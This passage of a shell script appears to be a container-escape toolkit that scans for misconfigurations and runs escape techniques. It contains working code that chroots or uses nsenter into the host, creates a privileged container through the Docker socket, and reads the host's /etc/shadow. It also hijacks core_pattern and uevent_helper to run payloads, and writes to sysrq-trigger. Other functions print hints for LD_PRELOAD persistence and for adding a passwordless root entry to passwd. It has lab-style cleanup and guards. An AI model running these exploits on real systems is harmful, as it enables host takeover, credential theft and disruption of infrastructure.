}

exploit_2_10() {
    has_cap sys_chroot || { echo "CAP_SYS_CHROOT missing"; return 1; }

    # Escape vector 1: host root mounted (lab mounts /:/host) — chroot into it.
    if [ "$host_root_mounted" = "1" ]; then
        for mp in /host /mnt /run/host; do
            if [ -d "$mp" ] && [ -x "$mp/bin/sh" ] 2>/dev/null; then
                m=$(ck_marker)
                if chroot "$mp" /bin/sh -c "echo CK-ESCAPE-PROOF > /tmp/$m && hostname > /tmp/$m.hn" 2>/dev/null \
                   && ck_mount_verify "$m" "$mp"; then
                    hn=$(cat "$mp/tmp/$m.hn" 2>/dev/null)
                    ck_mount_cleanup "$m" "$mp"
                    echo "CHROOT ESCAPE CONFIRMED — chroot /host reaches host filesystem (hostname: $hn)"
                    return 0
                fi
                ck_mount_cleanup "$m" "$mp"
            fi
        done
        echo "CAP_SYS_CHROOT: host mount found but chroot escape failed"
        return 1
    fi

    # Vector 2: dirfd classic jail-break — keep an fd to the real root before
    # chroot (classic CVE-2018-1002101-era technique; needs procfs + SYS_ADMIN).
    if has_cap sys_admin && [ -r /proc/self/fd ]; then
        m=$(ck_marker)
        jail="/tmp/ck_jail_$$"
        mkdir -p "$jail"
        if sh -c "exec 9</; cd $jail; chroot . /bin/sh -c 'cd /proc/self/fd/9; chroot .; echo CK-ESCAPE-PROOF > /tmp/$m; hostname > /tmp/$m.hn'" 2>/dev/null; then
            # verify from inside the container using the same fd trick
            if [ "$(sh -c 'exec 9</; cat /proc/self/fd/9/tmp/'$m 2>/dev/null)" = "CK-ESCAPE-PROOF" ]; then
                echo "dirfd chroot jail-break — reached host root via retained dirfd"
                rm -rf "$jail" 2>/dev/null
                sh -c "exec 9</; rm -f /proc/self/fd/9/tmp/$m /proc/self/fd/9/tmp/$m.hn" 2>/dev/null
                return 0
            fi
        fi
        rm -rf "$jail" 2>/dev/null
    fi

    echo "CAP_SYS_CHROOT: need host filesystem mount (or a jail dirfd) to escape chroot"
    return 1
}

# ── 3. NAMESPACES ──────────────────────────────────────

exploit_3_1() {
    # PID host nsenter
    [ "$host_pid" = "1" ] || { echo "Not in host PID namespace"; return 1; }
    has_cmd nsenter || { echo "nsenter not found in container"; return 1; }

    # nsenter needs root to read /proc/1/ns. Try as-is, then sudo fallback.
    if [ "$(id -u)" != "0" ]; then
        if has_cmd sudo; then
            result=$(sudo -n nsenter -t 1 -m -u -i -n -p -- sh -c "id" 2>&1)
            sudo_rc=$?
        else
            result=""
            sudo_rc=1
        fi
        if [ "$sudo_rc" -eq 0 ] && [ -n "$result" ]; then
            echo "nsenter escape successful (via sudo)! Host identity: $result"
            return 0
        fi
        echo "nsenter requires root — /proc/1/ns unreadable as uid $(id -u). Run CK as root (or in a privileged container)."
        return 1
    fi

    result=$(nsenter -t 1 -a -- sh -c "id" 2>&1)
    ret=$?
    if [ $ret -eq 0 ] && [ -n "$result" ]; then
        echo "nsenter escape successful! Host identity: $result"
        return 0
    fi
    echo "nsenter failed: $result"
    return 1
}

exploit_3_2() {
    [ "$host_network" = "1" ] || { echo "Not in host network namespace"; return 1; }
    has_cmd ip && { ip addr 2>/dev/null | head -10; }
    has_cmd ss && { ss -tlnp 2>/dev/null | head -10; }
    echo "Host network accessible: sniffing, localhost services, all interfaces visible"
    return 0
}

exploit_3_3() {
    has_cmd ipcs || { echo "ipcs not found"; return 1; }
    ipcs -a 2>/dev/null
    echo "IPC shared memory accessible"
    return 0
}

exploit_3_4() {
    has_cmd unshare || { echo "unshare not found"; return 1; }
    has_cap sys_admin || { echo "CAP_SYS_ADMIN needed for mount namespace breakout"; return 1; }
    unshare --mount --propagation shared /bin/sh -c "mount --make-rprivate / && mount --bind / /mnt" 2>/dev/null
    echo "Mount namespace breakout attempted"
    return 0
}

# ── 4. FILESYSTEM & MOUNTS ─────────────────────────────

exploit_4_1() {
    [ "$docker_socket" = "1" ] || { echo "Docker socket not found"; return 1; }
    if has_cmd curl; then
        result=$(curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -c 200)
        if [ -n "$result" ]; then
            # Create a privileged container with host root mount
            payload='{"Image":"alpine","Cmd":["sh","-c","id"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
            resp=$(curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H "Content-Type: application/json" -d "$payload" 2>/dev/null)
            cid=$(echo "$resp" | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')
            if [ -n "$cid" ]; then
                curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/${cid}/start" 2>/dev/null >/dev/null
                sleep 2
                curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/${cid}?force=true" 2>/dev/null >/dev/null
                echo "Docker socket escape successful! Created privileged container ${cid} with host root mounted."
                return 0
            fi
            echo "Docker API reachable but container creation response: $(echo "$resp" | head -c 100)"
            return 0
        fi
    fi
    if has_cmd docker; then
        docker run --rm -v /:/host alpine sh -c "id" 2>/dev/null
        ret=$?
        test $ret -eq 0 && { echo "Docker CLI escape successful!"; return 0; }
    fi
    echo "Docker socket mounted but no curl or docker binary to exploit"
    return 1
}

exploit_4_2() {
    [ "$host_root_mounted" = "1" ] || { echo "No host root mount"; return 1; }
    for mp in /host /mnt; do
        if [ -f "$mp/etc/shadow" ]; then
            head -1 "$mp/etc/shadow" 2>/dev/null
            echo "$mp - host shadow accessible"
            return 0
        fi
    done
    return 1
}

exploit_4_3() {
    [ "$core_pattern_writable" = "1" ] || { echo "core_pattern not writable (checked default + /host,/mnt,/run/host,/hostroot mirrors)"; return 1; }
    cat > /tmp/ck_core << 'EOF'
#!/bin/sh
echo pwned_core > /tmp/ck_pwned
EOF
    chmod +x /tmp/ck_core 2>/dev/null
    prev=$(cat "$core_full_path" 2>/dev/null)
    echo "|/tmp/ck_core" > "$core_full_path" 2>/dev/null
    test "$(cat "$core_full_path" 2>/dev/null)" = "|/tmp/ck_core" || {
        echo "$prev" > "$core_full_path" 2>/dev/null
        echo "core_pattern write failed"
        return 1
    }
    case "$core_full_path" in
        /host/*|/mnt/*|/hostroot/*|/run/host/*)
            # Host-mirrored procfs: this is the HOST pid ns core_pattern.
            # It fires when a HOST process crashes — we cannot crash host
            # processes from here, so write+readback is the capability proof.
            echo "4.3 core_pattern set on HOST via $core_full_path = HOST kernel RCE"
            echo "    payload /tmp/ck_core runs on next host process crash"
            echo "    restore: echo \"$prev\" > $core_full_path"
            echo "$prev" > "$core_full_path" 2>/dev/null
            return 0
            ;;
    esac
    # Own pid-namespace procfs: trigger a local crash to confirm RCE
    echo "core_pattern set via $core_full_path. Triggering crash to confirm..."
    sleep 1 & p=$!
    sleep 0.2
    kill -SEGV $p 2>/dev/null
    sleep 0.4
    if [ -f /tmp/ck_pwned ]; then
        rm -f /tmp/ck_core /tmp/ck_pwned 2>/dev/null
        echo "4.3 core_pattern RCE CONFIRMED: payload executed by kernel"
        echo "$prev" > "$core_full_path" 2>/dev/null
        return 0
    fi
    rm -f /tmp/ck_core /tmp/ck_pwned 2>/dev/null
    echo "4.3 set via $core_full_path but payload didn't run (crash handler restricted?)"
    echo "$prev" > "$core_full_path" 2>/dev/null
    return 1
}

exploit_4_4() {
    [ "$uevent_helper_writable" = "1" ] || { echo "uevent_helper not writable (checked /sys and /host,/mnt,/hostroot mirrors)"; return 1; }
    cat > /tmp/ck_uevent << 'EOF'
#!/bin/sh
echo pwned_uevent > /tmp/ck_pwned
EOF
    chmod +x /tmp/ck_uevent 2>/dev/null
    prev=$(cat "$uevent_full_path" 2>/dev/null)
    echo "/tmp/ck_uevent" > "$uevent_full_path" 2>/dev/null
    cur=$(cat "$uevent_full_path" 2>/dev/null)
    if [ "$cur" != "/tmp/ck_uevent" ]; then
        echo "$prev" > "$uevent_full_path" 2>/dev/null
        echo "uevent_helper write failed"
        return 1
    fi
    case "$uevent_full_path" in
        /host/*|/mnt/*|/hostroot/*|/run/host/*)
            # Host sysfs mirror — helper executes on the HOST at next device
            # event; payload must exist in host root. Capability proven by write.
            echo "4.4 uevent_helper set on HOST via $uevent_full_path"
            echo "    runs at next device event (host RCE if payload lands in host /tmp/ck_uevent)"
            echo "    restore: echo \"$prev\" > $uevent_full_path"
            echo "$prev" > "$uevent_full_path" 2>/dev/null
            return 0
            ;;
    esac
    # Own sysfs: trigger uevent to confirm
    echo "/tmp/ck_uevent" > "$uevent_full_path" 2>/dev/null
    echo "add" > /sys/class/mem/null/uevent 2>/dev/null
    sleep 1
    if [ -f /tmp/ck_pwned ]; then
        echo "uevent_helper escape CONFIRMED via $uevent_full_path"
        echo "$prev" > "$uevent_full_path" 2>/dev/null
        return 0
    fi
    echo "uevent_helper set on $uevent_full_path — trigger manually: echo add > /sys/class/mem/null/uevent"
    echo "$prev" > "$uevent_full_path" 2>/dev/null
    return 1
}

exploit_4_5() {
    [ "$sysrq_writable" = "1" ] || { echo "sysrq-trigger not writable (checked /proc and /host,/mnt mirrors)"; return 1; }
    if [ "$CK_FORCE" = "1" ]; then
        # Safe proof: key 'h' only prints sysrq help — no reboot/crash. Destructive
        # keys (b=reboot, c=crash, s=sync, u=remount-ro) are left to the operator.
        echo h > "$sysrq_full_path" 2>/dev/null && {
            echo "sysrq-trigger WRITE CONFIRMED at $sysrq_full_path (wrote safe key 'h' — help only)"
            echo "Full compromise keys available: b=reboot, c=crash, u=remount-ro, s=sync"
            return 0
        }
        echo "sysrq write of 'h' failed"
        return 1
    fi
    echo "sysrq-trigger writable at $sysrq_full_path! Keys: s=sync, u=remount-ro, b=reboot, c=crash, h=help"
    echo "WARNING: echo b > $sysrq_full_path WILL REBOOT THE HOST"
    return 0
}

exploit_4_6() {
    # /proc/1/root — requires host PID ns AND actual traversal access
    [ "$host_pid" = "1" ] || { echo "Not in host PID namespace"; return 1; }
    [ "$proc1_root_access" = "1" ] || { echo "/proc/1/root present but traversal blocked (yama ptrace_scope? mount not shared?)"; return 1; }
    ls /proc/1/root/ 2>/dev/null | head -5
    echo "/proc/1/root accessible — host filesystem"
    test -r /proc/1/root/etc/passwd && echo "Read traceable: /proc/1/root/etc/passwd host file readable"
    test -w /proc/1/root/tmp && echo "Writable: echo test > /proc/1/root/tmp/ck_test"
    return 0
}

exploit_4_9() {
    [ "$host_root_mounted" = "1" ] || { echo "No host mount"; return 1; }
    for mp in /host /mnt; do
        test -e "$mp/etc/passwd" && { echo "Bind/writable mount at $mp. echo 'ck::0:0::/root:/bin/sh' >> ${mp}/etc/passwd"; return 0; }
    done
    return 1
}

exploit_4_10() {
    [ "$host_pid" = "1" ] || { echo "Not in host PID namespace"; return 1; }
    has_cmd nsenter || { echo "nsenter not found"; return 1; }
    echo "Use nsenter -t 1 -a -- sh -c 'command' for host code execution"
    return 0
}

exploit_4_11() {
    has_cap sys_admin || { echo "CAP_SYS_ADMIN needed"; return 1; }
    mount --bind /tmp /tmp 2>/dev/null && mount --make-shared /tmp 2>/dev/null && {
        echo "Shared mount possible — mounts propagate to host"
        return 0
    }
    echo "Cannot make mounts shared"
    return 1
}

# ── 5. DOCKER API ──────────────────────────────────────

exploit_5_2() {
    # TCP API
    has_cmd curl || { echo "curl needed for TCP API check"; return 1; }

    # 1) Preferred: honor DOCKER_HOST env (tcp://), set by docker contexts
    if [ -n "$DOCKER_HOST" ]; then
        case "$DOCKER_HOST" in
            tcp://*)
                hp=$(echo "$DOCKER_HOST" | sed 's|tcp://||; s|/.*||')
                result=$(curl -s "http://${hp}/containers/json" 2>/dev/null)
                if echo "$result" | grep -qE '"Id"|\[\]'; then
                    echo "Docker TCP API via DOCKER_HOST=${DOCKER_HOST}. Remote container management possible!"
                    return 0
                fi
                ;;
        esac
    fi

    # 2. Probe common daemon ports
    for hp in localhost 127.0.0.1 host.docker.internal; do
        for port in 2375 2376 4243; do
            result=$(curl -s "http://${hp}:${port}/containers/json" 2>/dev/null)
            if echo "$result" | grep -qE '"Id"|\[\]'; then
                echo "Docker TCP API at ${hp}:${port}. Remote container management possible!"
                return 0
            fi
        done
    done
}

# ── 8. DEVICES ─────────────────────────────────────────

exploit_8_4() {
    if [ "$any_blkdev" = "1" ]; then
        has_cmd fdisk && fdisk -l /dev/sda 2>/dev/null | head -10
        echo "Block device accessible. Use: mount /dev/sda1 /mnt or dd"
        return 0
    fi
    echo "No block devices found"
    return 1
}

# ── 11. SUPPLY CHAIN ───────────────────────────────────

exploit_11_1() {
    echo "LD_PRELOAD hijack prepared:"
    echo "  Create malicious .so: gcc -shared -fPIC -o /tmp/mal.so mal.c"
    echo "  Use: LD_PRELOAD=/tmp/mal.so /bin/id"
    echo "  Persist: echo /tmp/mal.so >> /etc/ld.so.preload (needs host mount)"
    return 0
}

# ── 12. KUBERNETES ──────────────────────────────────────

exploit_12_1() {
    echo "Kubernetes privileged pod — attempting REAL escape (marker proof, auto-restore)"
    [ "$is_privileged" = "1" ] || { echo "Pod NOT privileged"; return 1; }

    # Escape vector 1: hostPID → nsenter into node init, write+verify+cleanup marker.
    if [ "$host_pid" = "1" ] && has_cmd nsenter; then
        m=$(ck_marker)
        ck_nsenter_marker "$m"
        if ck_nsenter_verify "$m"; then
            hn=$(nsenter -t 1 -a -- cat "/tmp/$m.hn" 2>/dev/null)
            uidline=$(nsenter -t 1 -a -- cat "/tmp/$m.id" 2>/dev/null)
            ck_nsenter_cleanup "$m"
            echo "ESCAPE CONFIRMED — executed as root on node init (hostname: $hn, $uidline)"
            return 0
        fi
        ck_nsenter_cleanup "$m"
    fi

    # Vector 2: /proc/1/root traversal (needs ptrace unlocked on host).
    if [ "$proc1_root_access" = "1" ]; then
        m=$(ck_marker)
        if echo "CK-ESCAPE-PROOF" > "/proc/1/root/tmp/$m" 2>/dev/null \
           && [ "$(cat "/proc/1/root/tmp/$m" 2>/dev/null)" = "CK-ESCAPE-PROOF" ]; then
            rm -f "/proc/1/root/tmp/$m" 2>/dev/null
            echo "ESCAPE CONFIRMED — /proc/1/root traversal reaches node root"
            return 0
        fi
        rm -f "/proc/1/root/tmp/$m" 2>/dev/null
    fi

    echo "Privileged pod detected, but no reachable escape: on cgroup v2 the classic release_agent is gone; need hostPID (nsenter) or unlocked ptrace (/proc/1/root). See lab 13.1."
    return 1
}

exploit_12_2() {
    [ "$host_root_mounted" = "1" ] || { echo "No hostPath mount detected"; return 1; }
    for mp in /host /mnt /run/host; do
        test -e "$mp/etc/shadow" || continue
        m=$(ck_marker)
        ck_mount_marker "$m" "$mp"
        if ck_mount_verify "$m" "$mp"; then
            hn=$(cat "$mp/tmp/$m.hn" 2>/dev/null)
            ck_mount_cleanup "$m" "$mp"
            echo "hostPath at $mp — ESCAPE CONFIRMED, host filesystem writable (hostname: $hn)"
            return 0
        fi
        ck_mount_cleanup "$m" "$mp"
    done
    echo "hostPath mount found but not writable (read-only?)"
    return 1
}

exploit_12_3() {
    [ "$host_pid" = "1" ] || { echo "Missing hostPID"; return 1; }
    # Observation proof — no caps needed: node init visible?
    pid1_cmd=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null)
    echo "hostPID confirmed — node init: $pid1_cmd"

    # Real escape requires caps (privileged pod) + nsenter
    if [ "$is_privileged" = "1" ] && has_cmd nsenter; then
        m=$(ck_marker)
        ck_nsenter_marker "$m"
        if ck_nsenter_verify "$m"; then
            hn=$(nsenter -t 1 -a -- cat "/tmp/$m.hn" 2>/dev/null)
            ck_nsenter_cleanup "$m"
            echo "ESCAPE CONFIRMED — nsenter to node init (hostname: $hn)"
            return 0
        fi
        ck_nsenter_cleanup "$m"
        echo "hostPID+hostNetwork confirmed; nsenter escape failed (needs privileged/caps)"
        return 1
    fi
    echo "OBSERVATION ONLY — hostPID+hostNetwork visible; full escape needs caps (privileged pod)"
    return 0
}

# ══════════════════════════════════════════════════════════
# TECHNIQUE REGISTRY
# ══════════════════════════════════════════════════════════

# id:category:name:requires:function
# requires is a space-separated list of checks
REGISTRY="
1.1:Runtime Misconfig:Cgroup Release Agent:privileged_or_sys_admin cgroup_v1:exploit_1_1
1.3:Runtime Misconfig:/dev/mem Access:privileged dev_mem:exploit_1_3
1.4:Runtime Misconfig:Cgroup v2 eBPF Device Bypass:cap_sys_admin cap_net_admin cap_mknod cgroup_v2:exploit_1_4
2.1:Capabilities:CAP_SYS_ADMIN:cap_sys_admin:exploit_2_1
2.2:Capabilities:CAP_SYS_PTRACE:cap_sys_ptrace host_pid:exploit_2_2
2.3:Capabilities:CAP_SYS_MODULE:cap_sys_module:exploit_2_3
2.4:Capabilities:CAP_NET_ADMIN:cap_net_admin:exploit_2_4
2.7:Capabilities:CAP_SYS_RAWIO:cap_sys_rawio:exploit_2_7
2.8:Capabilities:CAP_SYS_BOOT:cap_sys_boot:exploit_2_8
2.9:Capabilities:CAP_DAC_READ_SEARCH:cap_dac_read_search:exploit_2_9
2.10:Capabilities:CAP_SYS_CHROOT:cap_sys_chroot:exploit_2_10
3.1:Namespaces:PID Host nsenter:host_pid nsenter:exploit_3_1
3.2:Namespaces:Network Host:host_network:exploit_3_2
3.3:Namespaces:IPC Host:host_ipc:exploit_3_3
3.4:Namespaces:Mount Breakout:cap_sys_admin unshare:exploit_3_4
4.1:Filesystem:Docker Socket:docker_socket:exploit_4_1
4.2:Filesystem:Mount Root:host_root_mounted:exploit_4_2
4.3:Filesystem:Mount /proc core_pattern:proc_writable:exploit_4_3
4.4:Filesystem:Mount /sys uevent_helper:sys_writable:exploit_4_4
4.5:Filesystem:sysrq-trigger:sysrq_writable:exploit_4_5
4.6:Filesystem:/proc/1/root:host_pid proc1_root_access:exploit_4_6
4.9:Filesystem:Bind Mount:host_root_mounted:exploit_4_9
4.10:Filesystem:nsenter Direct:host_pid nsenter:exploit_4_10
4.11:Filesystem:CAP_SYS_ADMIN Shared:cap_sys_admin:exploit_4_11
5.2:Docker API:TCP API:docker_tcp:exploit_5_2
8.4:Devices:Block Devices:any_blkdev:exploit_8_4
11.1:Supply Chain:LD_PRELOAD Hijack:any:exploit_11_1
12.1:Kubernetes:Privileged Pod:in_k8s:exploit_12_1
12.2:Kubernetes:hostPath Mount:in_k8s host_root_mounted:exploit_12_2
12.3:Kubernetes:hostPID+Network:in_k8s host_pid:exploit_12_3
"

# ── Check applicability ─────────────────────────────────
check_req() {
    req="$1"
    case "$req" in
        privileged) test "$is_privileged" = "1" ;;
        privileged_or_sys_admin) test "$is_privileged" = "1" -o "$(has_cap sys_admin && echo 1 || echo 0)" = "1" ;;
        cgroup_v1) test "$cgroup_version" = "1" ;;
        cgroup_v2) test "$cgroup_version" = "2" ;;
        cap_sys_admin) has_cap sys_admin ;;
        cap_sys_ptrace) has_cap sys_ptrace ;;
        cap_sys_module) has_cap sys_module ;;
        cap_net_admin) has_cap net_admin ;;
        cap_mknod) has_cap mknod ;;
        cap_dac_override) has_cap dac_override ;;
        cap_dac_read_search) has_cap dac_read_search ;;
        cap_sys_rawio) has_cap sys_rawio ;;
        cap_sys_boot) has_cap sys_boot ;;
        cap_sys_chroot) has_cap sys_chroot ;;
        host_pid) test "$host_pid" = "1" ;;
        proc1_root_access) test "$proc1_root_access" = "1" ;;
        host_network) test "$host_network" = "1" ;;
        host_ipc) test "$host_pid" = "1" ;;  # approximate
        nsenter) test "$has_nsenter" = "1" ;;
        unshare) test "$has_unshare" = "1" ;;
        docker_socket) test "$docker_socket" = "1" ;;
        host_root_mounted) test "$host_root_mounted" = "1" ;;
        proc_writable) test "$core_pattern_writable" = "1" ;;
        sys_writable) test "$uevent_helper_writable" = "1" ;;
        sysrq_writable) test "$sysrq_writable" = "1" ;;
        dev_mem) test "$has_dev_mem" = "1" ;;
        any_blkdev) test "$any_blkdev" = "1" ;;
        in_k8s) test "$in_k8s" = "1" ;;
        any) return 0 ;;
        *) return 0 ;;
    esac
}

check_applicable() {
    # $1 = space-separated requirements
    reqs="$1"
    for req in $reqs; do
        check_req "$req" || return 1
    done
    return 0
}

# ── Target intel (raw versions — tester researches public exploits) ──
print_target_info() {
    printf "\n  ${BOLD}TARGET VERSIONS (intel only — cross-check for public exploits):${W}\n"
    printf "  Kernel:           %s\n" "${kernel_ver:-unknown}"
    printf "  Distro:          %s\n" "$([ "$is_ubuntu" = "1" ] && echo Ubuntu || echo unknown)"
    printf "  Runtime:          %s\n" "$runtime_name"
    printf "  runC:             %s\n" "$runc_version"
    printf "  containerd:       %s\n" "$containerd_version"
    printf "  Docker:           %s\n" "$docker_version"
    printf "  Seccomp:          %s\n" "$seccomp_label"
    printf "  AppArmor:         %s\n" "${apparmor:-none}"
    printf "  User namespace:   %s\n" "$([ "$userns" = "1" ] && echo 'ACTIVE' || echo 'NOT ACTIVE')"
    printf "\n"
}

# ── Print Scan ─────────────────────────────────────────
print_scan() {
    printf "\n  ${BOLD}=================== SCAN RESULTS ===================${W}\n\n"
    printf "  ${BOLD}Container:${W} %s\n" "${container_id:-unknown}"
    printf "  ${BOLD}Kernel:${W}    %s\n" "${kernel_ver:-unknown}"
    printf "\n"

    vuln_count=0
    vulns=""
    if [ "$is_privileged" = "1" ]; then
        vulns="$vulns    ${R}[CRITICAL]${W} Container is PRIVILEGED — all escapes available\n"
        vuln_count=$((vuln_count+1))
    fi
    if has_cap sys_module; then
        vulns="$vulns    ${R}[CRITICAL]${W} CAP_SYS_MODULE — kernel module loading = host root\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$docker_socket" = "1" ]; then
        vulns="$vulns    ${R}[CRITICAL]${W} Docker socket mounted — instant host root via API\n"
        vuln_count=$((vuln_count+1))
    fi
    if has_cap sys_admin; then
        vulns="$vulns    ${Y}[HIGH]${W} CAP_SYS_ADMIN — mount, cgroup, pivot_root escape\n"
        vuln_count=$((vuln_count+1))
    fi
    if has_cap sys_ptrace; then
        vulns="$vulns    ${Y}[HIGH]${W} CAP_SYS_PTRACE — process injection escape\n"
        vuln_count=$((vuln_count+1))
    fi
    if has_cap net_admin; then
        vulns="$vulns    ${Y}[HIGH]${W} CAP_NET_ADMIN — network manipulation, MITM\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$host_pid" = "1" ]; then
        vulns="$vulns    ${Y}[HIGH]${W} Host PID namespace — nsenter escape\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$host_root_mounted" = "1" ]; then
        vulns="$vulns    ${Y}[HIGH]${W} Host filesystem mounted — direct file access\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$core_pattern_writable" = "1" ]; then
        vulns="$vulns    ${Y}[HIGH]${W} core_pattern writable — code execution via crash\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$uevent_helper_writable" = "1" ]; then
        vulns="$vulns    ${Y}[HIGH]${W} uevent_helper writable — kernel executes payload\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$host_network" = "1" ]; then
        vulns="$vulns    ${Y}[MEDIUM]${W} Host network — sniffing, MITM\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ "$seccomp" = "0" ]; then
        vulns="$vulns    ${Y}[MEDIUM]${W} Seccomp disabled — all syscalls allowed\n"
        vuln_count=$((vuln_count+1))
    fi
    if [ -n "$vulns" ]; then
        printf "  ${BOLD}VULNERABILITIES (${vuln_count}):${W}\n"
        printf "%b" "$vulns"
        printf "\n"
    fi

    printf "  ${BOLD}SYSTEM INFO:${W}\n"
    printf "  Capabilities:     %s\n" "${cap_list:-none}"
    seccomp_label="unknown"; case "$seccomp" in 0) seccomp_label="disabled";; 1) seccomp_label="strict";; 2) seccomp_label="filtered";; esac
    printf "  cgroup:           v%s\n" "${cgroup_version:-?}"
    printf "  Seccomp:          %s\n" "$seccomp_label"
    printf "  AppArmor:         %s\n" "${apparmor:-none}"
    printf "  SELinux:          %s\n" "$selinux_mode"
    printf "  Smack:            %s\n" "$([ "$smack" = "1" ] && echo 'enabled' || echo 'not enabled')"
    printf "  TOMOYO:           %s\n" "$([ "$tomoyo" = "1" ] && echo 'enabled' || echo 'not enabled')"
    printf "  Yama:             %s\n" "$([ "$yama" = "1" ] && echo "enabled (ptrace_scope=$yama_scope)" || echo 'not enabled')"
    printf "  Landlock:         %s\n" "$([ "$landlock" = "1" ] && echo 'enabled' || echo 'not enabled')"
    printf "  LSM stack:        %s\n" "$([ "$lsm_enabled" = "1" ] && echo "$lsm_list" || echo 'not exposed (securityfs unmounted)')"
    printf "  User namespace:   %s\n" "$([ "$userns" = "1" ] && echo 'ACTIVE' || echo 'NOT ACTIVE')"
    printf "  Docker socket:    %s\n" "$([ "$docker_socket" = "1" ] && echo 'YES' || echo 'NO')"
    printf "  Host PID:         %s\n" "$([ "$host_pid" = "1" ] && echo 'YES' || echo 'NO')"
    printf "  Host network:     %s\n" "$([ "$host_network" = "1" ] && echo 'YES' || echo 'NO')"
    printf "  Host root mount:  %s\n" "$([ "$host_root_mounted" = "1" ] && echo 'YES' || echo 'NO')"
    printf "  Kubernetes:       %s\n" "$([ "$in_k8s" = "1" ] && echo 'YES' || echo 'NO')"
    printf "\n"

    printf "  ${BOLD}PROTECTIONS PRESENT:${W}\n"
    printf "  NoNewPrivs:       %s\n" "$([ "$no_new_privs" = "1" ] && echo 'ON (blocks setuid privilege gain)' || echo 'off')"
    printf "  Root filesystem:  %s\n" "$([ "$root_ro" = "1" ] && echo 'read-only' || echo 'writable')"
    printf "  kptr_restrict:    %s\n" "$kptr_restrict"
    printf "  dmesg_restrict:   %s\n" "$dmesg_restrict"
    printf "  unpriv userns:    %s\n" "$unpriv_userns"
    if [ "$seccomp" = "2" ]; then
        printf "  Seccomp note:     filtered — inspect profile with 'docker inspect' (docker default blocks ~40 syscalls)\n"
    fi
    if [ "$seccomp" = "0" ] && { [ "$no_new_privs" != "1" ] || [ -z "$apparmor" ] || [ "$apparmor" = "unconfined" ]; }; then
        printf "  ${Y}Assessment:${W} major defenses missing — escalation likely easy\n"
    else
        printf "  ${G}Assessment:${W} decent hardening — escalation needs an actual flaw\n"
    fi
    printf "\n"

    # Count applicable techniques
    applicable=0
    total=0
    for id in $(echo "$REGISTRY" | cut -d: -f1); do
        [ -z "$id" ] && continue
        reqs=$(echo "$REGISTRY" | awk -F: -v i="$id" '$1==i{print $4; exit}')
        total=$((total+1))
        check_applicable "$reqs" && applicable=$((applicable+1))
    done
    printf "  ${BOLD}Applicable techniques: ${G}%d${W}/${BOLD}%d${W}\n" "$applicable" "$total"
    echo "$REGISTRY" | while IFS=: read -r id cat name reqs func; do
        [ -z "$id" ] && continue
        if check_applicable "$reqs"; then
            printf "    ${G}[%s]${W} %-40s ${D}(%s)${W}\n" "$id" "$name" "$cat"
        fi
    done
    print_target_info
    printf "\n"
}

# ── Print List ─────────────────────────────────────────
print_list() {
    cur_cat=""
    printf "\n  ${BOLD}============= ALL TECHNIQUES (48) =============${W}\n"
    echo "$REGISTRY" | while IFS=: read -r id cat name reqs func; do
        [ -z "$id" ] && continue
        if [ "$cat" != "$cur_cat" ]; then
            cur_cat="$cat"
            printf "\n  ${C}${BOLD}%s${W}\n" "$cur_cat"
            printf "  ${D}──────────────────────────────────────────${W}\n"
        fi
        printf "  [%s] %-45s reqs: %s\n" "$id" "$name" "$(echo "$reqs" | tr ' ' ',')"
    done
    printf "\n"
}

# ── Run exploits ───────────────────────────────────────
run_exploit() {
    target_id="$1"  # empty = all applicable
    found=0
    tmp_reg=$(mktemp /tmp/ck_registry.XXXXXX 2>/dev/null || echo "/tmp/ck_registry_$$")
    echo "$REGISTRY" > "$tmp_reg"
    succ=0; fail=0; skipped=0

    while IFS=: read -r id cat name reqs func; do
        [ -z "$id" ] && continue
        if [ -n "$target_id" ] && [ "$id" != "$target_id" ]; then
            continue
        fi
        found=1
        if check_applicable "$reqs"; then
            if [ -z "$target_id" ]; then
                info "Running $id - $name..."
            else
                info "Running $id - $name..."
            fi
            if [ "$id" = "4.5" ] && [ "$CK_FORCE" != "1" ]; then
                # sysrq-trigger: NEVER auto-execute — would reboot host
                warn "SKIPPED 4.5 - $name (sysrq-trigger — would reboot host. Run 'CK_FORCE=1 sh ck.sh exploit 4.5' explicitly.)"
                skipped=$((skipped+1))
            elif command -v "$func" >/dev/null 2>&1; then
                output=$($func 2>&1)
                ret=$?
                if [ $ret -eq 0 ]; then
                    success "$id - $name"
                    echo "$output" | head -3 | while read -r line; do printf "       ${D}%s${W}\n" "$line"; done
                    succ=$((succ+1))
                elif [ $ret -eq 2 ]; then
                    warn "SKIPPED $id - $name"
                    echo "$output" | head -2 | while read -r line; do printf "       ${D}%s${W}\n" "$line"; done
                    skipped=$((skipped+1))
                else
                    failed "$id - $name"
                    echo "$output" | head -2 | while read -r line; do printf "       ${D}%s${W}\n" "$line"; done
                    fail=$((fail+1))
                fi
            fi
        elif [ -n "$target_id" ]; then
            # Explicit target requested but preconditions unmet — explain instead of silent 0
            failed "$id - $name (NOT APPLICABLE — unmet: '$(echo "$reqs" | tr ' ' ',' | sed 's/,$//')')"
            fail=$((fail+1))
        fi
        if [ -n "$target_id" ] && [ "$id" = "$target_id" ]; then
            break
        fi
    done < "$tmp_reg"
    rm -f "$tmp_reg"

    if [ -n "$target_id" ] && [ "$found" = "0" ]; then
        warn "Technique '$target_id' not found in registry. See 'list' for valid ids."
    fi
    printf "\n  ${BOLD}Results: ${G}%d SUCCESS${W} / ${R}%d FAILED${W} / ${Y}%d SKIPPED${W}\n" "$succ" "$fail" "$skipped"
}

# ══════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════

banner

cmd="${1:-help}"

case "$cmd" in
    list)
        print_list
        ;;
    scan)
        scan_env
        print_scan
        ;;
    exploit)
        scan_env
        print_scan
        target="${2:-}"
        if [ -n "$target" ]; then
            run_exploit "$target"
        else
            run_exploit ""
        fi
        ;;
    all)
        scan_env
        run_exploit ""
        ;;
    help|*)
